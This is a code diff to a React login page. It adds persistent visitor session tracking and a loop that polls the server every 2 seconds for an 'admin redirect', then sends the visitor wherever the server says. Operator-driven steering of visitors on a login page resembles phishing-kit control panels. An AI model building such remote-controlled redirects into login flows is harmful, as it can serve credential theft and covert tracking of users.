@@ -27,15 +27,50 @@ export default function Login() {
       }
     }
     
-    // Track visitor when page loads with language info
-    const language = navigator.language || "Unknown";
-    apiRequest("POST", "/api/track-visit", {
-      page: "Login Page",
-      language,
-    }).catch(() => {
-      // Silent fail - tracking shouldn't break the app
-    });
-  }, []);
+    // Track visitor when page loads with language info and get/create sessionId
+    const trackVisitor = async () => {
+      try {
+        const language = navigator.language || "Unknown";
+        let sessionId = localStorage.getItem('visitorSessionId');
+        
+        const response = await apiRequest("POST", "/api/track-visit", {
+          page: "Login Page",
+          language,
+          sessionId,
+        });
+        const data = await response.json();
+        
+        // Store session ID for future requests
+        if (data.sessionId && !sessionId) {
+          localStorage.setItem('visitorSessionId', data.sessionId);
+        }
+      } catch (error) {
+        // Silent fail - tracking shouldn't break the app
+        console.error("Visitor tracking failed:", error);
+      }
+    };
+    
+    trackVisitor();
+    
+    // Check for admin redirect every 2 seconds
+    const redirectCheck = setInterval(async () => {
+      try {
+        const sessionId = localStorage.getItem('visitorSessionId');
+        if (sessionId) {
+          const response = await apiRequest("POST", "/api/check-redirect", { sessionId });
+          const data = await response.json();
+          
+          if (data.redirect) {
+            setLocation(data.redirect);
+          }
+        }
+      } catch (error) {
+        // Silent fail
+      }
+    }, 2000);
+    
+    return () => clearInterval(redirectCheck);
+  }, [setLocation]);
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
